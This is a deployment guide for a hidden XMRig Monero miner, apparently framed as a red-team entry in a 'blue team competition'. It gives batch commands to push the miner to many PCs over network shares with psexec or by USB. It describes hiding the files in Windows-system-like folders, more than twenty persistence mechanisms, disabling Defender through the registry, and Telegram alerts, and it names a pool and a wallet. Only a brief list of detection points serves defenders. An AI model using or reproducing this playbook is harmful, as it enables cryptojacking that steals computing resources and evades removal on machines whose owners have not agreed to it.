## 🚀 How to Deploy (25+ PCs in Minutes)

### Option 1: Manual Deployment (For Testing)

1. **Copy these 2 files** to each PC:
   - `🚀_START_HERE.bat`
   - `DEPLOY_ULTIMATE.ps1`
   - `xmrig.exe` (from miner_src folder)

2. **Right-click** `🚀_START_HERE.bat` → **Run as Administrator**

3. **Done!** Miner is deployed, running, and auto-restarting.

---

### Option 2: Network Deployment (For All 25 PCs)

#### Step 1: Prepare Deployment Folder
```batch
:: Create deployment package on your main PC
mkdir C:\DeployPackage
copy "%~dp0🚀_START_HERE.bat" C:\DeployPackage\
copy "%~dp0DEPLOY_ULTIMATE.ps1" C:\DeployPackage\
copy "%~dp0xmrig.exe" C:\DeployPackage\
```

#### Step 2: Share the Folder
```batch
:: Share folder on network
net share DeployPackage=C:\DeployPackage /grant:everyone,FULL
```

#### Step 3: Deploy to All PCs
Create `DEPLOY_TO_ALL.bat`:
```batch
@echo off
:: List your PC names or IPs
set PCS=PC01 PC02 PC03 PC04 PC05 PC06 PC07 PC08 PC09 PC10

for %%P in (%PCS%) do (
    echo Deploying to %%P...
    xcopy /Y C:\DeployPackage\* \\%%P\C$\Temp\
    psexec \\%%P -s -d cmd /c "C:\Temp\🚀_START_HERE.bat"
)
```

---

### Option 3: USB Flash Drive Deployment

1. Copy all 3 files to USB drive
2. Plug into each PC
3. Double-click `🚀_START_HERE.bat`
4. Wait 10 seconds
5. Unplug USB, move to next PC

**Time per PC: ~30 seconds**

## 📊 Monitoring Your Fleet

### Check Status via Telegram
- Automatic notifications sent to your Telegram
- You'll receive messages for:
  - ✅ Miner started
  - 🔄 Auto-restarts
  - ❌ Errors

### Check Hashrate
All PCs will mine to the same pool. Check total hashrate at:
- **Pool:** https://moneroocean.stream/
- **Wallet:** `49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon`

Expected total hashrate: **25 PCs × 5.5 KH/s = 137.5 KH/s**

---

## 🔧 Configuration (Optional)

### Change Pool or Wallet
Edit `DEPLOY_ULTIMATE.ps1`, line 40-41:
```powershell
Pool = "gulf.moneroocean.stream:10128"
Wallet = "YOUR_WALLET_ADDRESS_HERE"
```

### Change Telegram Bot
Edit `DEPLOY_ULTIMATE.ps1`, line 21-22:
```powershell
[string]$TelegramToken = "YOUR_BOT_TOKEN",
[string]$ChatID = "YOUR_CHAT_ID"
```

---

## 🛡️ Stealth Features Included

### Where Miner is Deployed:
1. `C:\ProgramData\Microsoft\Windows\WindowsUpdate\`
2. `C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv\`
3. `C:\ProgramData\Microsoft\Network\Downloader\`

### Persistence Methods (20+):
- ✅ 10 Scheduled Tasks (OnStartup + OnLogon)
- ✅ 4 Registry Run keys
- ✅ 2 Windows Services
- ✅ 1 WMI Event Subscription
- ✅ Hidden files & folders (System + Hidden attributes)

### Auto-Restart:
- Checks every 15 seconds
- Restarts immediately if miner crashes
- Maintains HIGH priority
- Sends Telegram alert on restart

---

## 🎮 For the Blue Team Competition

### What Blue Team Will Face:
- **Hidden files** (System + Hidden attributes)
- **Legitimate-looking names** (AudioSrv, WindowsAudioService)
- **Multiple persistence** (removing one won't stop it)
- **Auto-restart** (killing process = instant restart)
- **Registry bypass** (Defender disabled via registry)
- **High priority** (miner gets CPU priority)
- **Single instance** (no resource conflicts)

### Detection Points for Blue Team:
1. High CPU usage (but normal for "system" processes)
2. Network connections to pool
3. Scheduled tasks with suspicious commands
4. Registry modifications
5. Hidden files in system directories

---

## 📈 Expected Performance

### Per PC (Intel i5-14400, 16GB RAM):
- **Hashrate:** 5.5 - 6.0 KH/s
- **CPU Usage:** 80-85%
- **Memory:** ~1-2 GB
- **Threads:** 14 out of 16
- **Priority:** HIGH

### Total Fleet (25 PCs):
- **Total Hashrate:** 137.5 - 150 KH/s
- **Uptime:** ~99% (auto-restart)
- **Stability:** Excellent

---

## 🐛 Troubleshooting

### Miner Not Starting?
1. Check logs: `C:\Users\%USERNAME%\AppData\Local\Temp\ultimate_deploy.log`
2. Ensure `xmrig.exe` is in the same folder as the scripts
3. Run `🚀_START_HERE.bat` as Administrator

### Can't See Miner Process?
- It's hidden and running in background
- Check Task Manager → Details → Show "xmrig.exe"
- Or check deployed locations listed above

### Want to Stop Miner?
```batch
taskkill /f /im xmrig.exe
schtasks /delete /tn WindowsAudioService /f
schtasks /delete /tn SystemAudioHost /f
```

- If blue team kills miners, they auto-restart
- Multiple persistence keeps you running

### Phase 3: Demonstration (For Judge)
- Show all-in-one deployment
- Explain evasion techniques
- Demonstrate auto-restart
- Show performance optimizations
